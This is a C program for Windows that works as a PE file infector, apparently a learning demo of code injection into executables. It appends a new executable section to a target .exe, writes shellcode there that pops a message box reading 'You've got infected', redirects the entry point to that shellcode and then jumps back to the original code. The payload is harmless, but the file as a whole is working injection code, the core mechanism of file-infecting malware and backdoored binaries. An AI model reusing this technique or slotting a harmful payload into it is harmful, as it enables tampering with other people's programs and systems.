#include <stdio.h>
#include <Windows.h>

#define _CRT_SECURE_NO_WARNINGS

#define NEW_SECTION_NAME ".newsec"
#define NEW_SECTION_SIZE 0x1000

typedef int (WINAPI* MessageBoxA_t)(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType);

// Utility function to align a value up to the nearest multiple of 'alignment'.
DWORD AlignUp(DWORD size, DWORD alignment) {
    return (size + alignment - 1) & ~(alignment - 1);
}

DWORD calculateJMPAdress(DWORD instructionAddress, DWORD targetAddress) {
    if (targetAddress >= instructionAddress) {
        return targetAddress - instructionAddress;
    }
    else {
        return (0xFFFFFFFF - instructionAddress) + targetAddress + 1;
    }
}

DWORD GetMessageBoxAAddress() {
    HMODULE user32Module = LoadLibraryA("user32.dll");
    if (user32Module != NULL) {
        FARPROC messageBoxAddr = GetProcAddress(user32Module, "MessageBoxA");
        FreeLibrary(user32Module); // Free the module handle since we've obtained the address
        if (messageBoxAddr != NULL) {
            return (DWORD)messageBoxAddr;
        }
    }
    return 0; // Return 0 if unable to get the address
}

BOOL AddSection(const char* filename) {
    HANDLE hFile;
    HANDLE hMapping;
    LPVOID lpFile;
    DWORD fileSize;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeaders;
    PIMAGE_SECTION_HEADER sectionHeader;
    DWORD newSectionOffset, newSectionSize;

    // Open the file
    hFile = CreateFileA(filename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error opening file %s\n", filename);
        return FALSE;
    }

    // Create a file mapping
    fileSize = GetFileSize(hFile, NULL);
    hMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, fileSize, NULL);
    if (!hMapping) {
        printf("Error creating file mapping.\n");
        CloseHandle(hFile);
        return FALSE;
    }

    // Map the file into memory
    lpFile = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, fileSize);
    if (!lpFile) {
        printf("Error mapping file.\n");
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Get the DOS header
    dosHeader = (PIMAGE_DOS_HEADER)lpFile;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Not a valid PE file.\n");
        UnmapViewOfFile(lpFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Get the NT headers
    ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)lpFile + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Not a valid PE signature.\n");
        UnmapViewOfFile(lpFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Add a new section
    newSectionOffset = AlignUp(((PIMAGE_SECTION_HEADER)(ntHeaders + 1) + ntHeaders->FileHeader.NumberOfSections - 1)->PointerToRawData +
        ((PIMAGE_SECTION_HEADER)(ntHeaders + 1) + ntHeaders->FileHeader.NumberOfSections - 1)->SizeOfRawData,
        ntHeaders->OptionalHeader.FileAlignment);
    newSectionSize = AlignUp(NEW_SECTION_SIZE, ntHeaders->OptionalHeader.SectionAlignment);

    // Check if there's enough space for another section header
    if (ntHeaders->FileHeader.NumberOfSections >= 96) {  // Common maximum is 96 sections
        printf("Maximum number of sections reached.\n");
        UnmapViewOfFile(lpFile);
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Setup the new section header
    sectionHeader = (PIMAGE_SECTION_HEADER)(ntHeaders + 1) + ntHeaders->FileHeader.NumberOfSections;
    memset(sectionHeader, 0, sizeof(IMAGE_SECTION_HEADER));
    memcpy(sectionHeader->Name, NEW_SECTION_NAME, sizeof(NEW_SECTION_NAME) - 1);
    sectionHeader->Misc.VirtualSize = NEW_SECTION_SIZE;
    sectionHeader->SizeOfRawData = newSectionSize;
    sectionHeader->PointerToRawData = newSectionOffset;
    sectionHeader->VirtualAddress = AlignUp(((PIMAGE_SECTION_HEADER)(ntHeaders + 1) + ntHeaders->FileHeader.NumberOfSections - 1)->VirtualAddress +
        ((PIMAGE_SECTION_HEADER)(ntHeaders + 1) + ntHeaders->FileHeader.NumberOfSections - 1)->Misc.VirtualSize,
        ntHeaders->OptionalHeader.SectionAlignment);
    sectionHeader->Characteristics = 0xE00000E0;

    // Update the number of sections
    ntHeaders->FileHeader.NumberOfSections++;

    // Update the size of the image
    ntHeaders->OptionalHeader.SizeOfImage = sectionHeader->VirtualAddress + sectionHeader->Misc.VirtualSize;

    // Unmap and close handles
    UnmapViewOfFile(lpFile);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    // Extend the file to fit the new section
    hFile = CreateFileA(filename, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    SetFilePointer(hFile, newSectionOffset + newSectionSize, NULL, FILE_BEGIN);
    SetEndOfFile(hFile);
    CloseHandle(hFile);

    return TRUE;
}

// Function to append data to the last section of a PE file
BOOL AppendDataToLastSection(const char* filePath) {
    HANDLE hFile;
    HANDLE hFileMapping;
    LPVOID lpFileBase;
    PIMAGE_DOS_HEADER dosHeader;
    PIMAGE_NT_HEADERS ntHeaders;
    PIMAGE_SECTION_HEADER sectionHeader;
    DWORD dwSize;
    DWORD dwOffset;

    // Open the file
    hFile = CreateFileA(filePath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Could not open file (error %lu)\n", GetLastError());
        return FALSE;
    }

    // Create a file mapping object
    hFileMapping = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
    if (!hFileMapping) {
        printf("Could not create file mapping object (error %lu)\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    // Map the file into the address space of the current process
    lpFileBase = MapViewOfFile(hFileMapping, FILE_MAP_WRITE, 0, 0, 0);
    if (!lpFileBase) {
        printf("Could not map view of file (error %lu)\n", GetLastError());
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Get the DOS header of the file
    dosHeader = (PIMAGE_DOS_HEADER)lpFileBase;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("Invalid DOS signature\n");
        UnmapViewOfFile(lpFileBase);
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Get the NT headers
    ntHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)lpFileBase + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("Invalid NT signature\n");
        UnmapViewOfFile(lpFileBase);
        CloseHandle(hFileMapping);
        CloseHandle(hFile);
        return FALSE;
    }

    // Get the last section header
    sectionHeader = IMAGE_FIRST_SECTION(ntHeaders) + (ntHeaders->FileHeader.NumberOfSections - 1);

    //Base shellcode 0x7532AE40
    char shellCode[] = 
        "\x6A\x00"                  // PUSH 0
        "\x68\x00\x00\x00\x00"      // PUSH "Injected Calculator"
        "\x68\x00\x00\x00\x00"      // PUSH "You've got infected"
        "\x6A\x00"                  // PUSH 0
        "\xE8\x00\x00\x00\x00"      // CALL USER32.MessageBoxA
        "\xE9\x00\x00\x00\x00";     // JMP 1012475

    // Calculate the offset and size for the new data with added the section
    const char* titleStr = "Injected Calculator";
    DWORD titleOffset = 0x30;
    const char* captionStr = "You've got infected";
    DWORD captionOffset = 0x50;

    // Append the strings
    memcpy((PBYTE)lpFileBase + sectionHeader->PointerToRawData + titleOffset, titleStr, strlen(titleStr) + 1);
    memcpy((PBYTE)lpFileBase + sectionHeader->PointerToRawData + captionOffset, captionStr, strlen(captionStr) + 1);

    // Edit shellcode and change the EntryPoint to the newly added section
    *(DWORD*)(shellCode + 3) = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase + titleOffset;
    *(DWORD*)(shellCode + 8) = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase + captionOffset;
    DWORD messageBoxARVA = GetMessageBoxAAddress() - (sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase + 19);
    *(DWORD*)(shellCode + 15) = messageBoxARVA;
    DWORD nextJMPAddress = sectionHeader->VirtualAddress + ntHeaders->OptionalHeader.ImageBase + sizeof(shellCode) - 1;
    DWORD oldOEP = ntHeaders->OptionalHeader.ImageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    DWORD jmpRVA = calculateJMPAdress(nextJMPAddress, oldOEP);
    *(DWORD*)(shellCode + 20) = jmpRVA;
    memcpy((PBYTE)lpFileBase + sectionHeader->PointerToRawData, shellCode, sizeof(shellCode));
    ntHeaders->OptionalHeader.AddressOfEntryPoint = sectionHeader->VirtualAddress;

    // Unmap the file from memory and close handles
    UnmapViewOfFile(lpFileBase);
    CloseHandle(hFileMapping);
    CloseHandle(hFile);

    return TRUE;
}

int main(int argc, char* argv[]) {
    if (argc < 2) {
        printf("Usage: %s <file_path>\n", argv[0]);
        return 1;
    }

    const char* filePath = argv[1];

    AddSection(filePath);
    if (AppendDataToLastSection(filePath)) {
        printf("Appended data successfully!\n");
        return 0;
    }
    return 1;

}